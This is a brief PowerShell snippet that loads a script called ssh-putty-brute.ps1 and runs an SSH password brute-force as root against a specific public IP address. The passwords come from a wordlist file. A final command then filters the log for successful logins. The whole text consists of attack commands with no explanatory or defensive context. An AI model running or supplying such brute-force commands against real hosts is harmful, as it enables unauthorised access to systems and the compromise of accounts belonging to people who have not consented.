. .\ssh-putty-brute.ps1

ssh-putty-brute -h 193.56.29.106 -p 22 -u root -pw (Get-Content K:\security\wordlists\AcidDr0p.net\new_pwlist.lst)

Get-Content ssh-putty-brute.log | Select-String True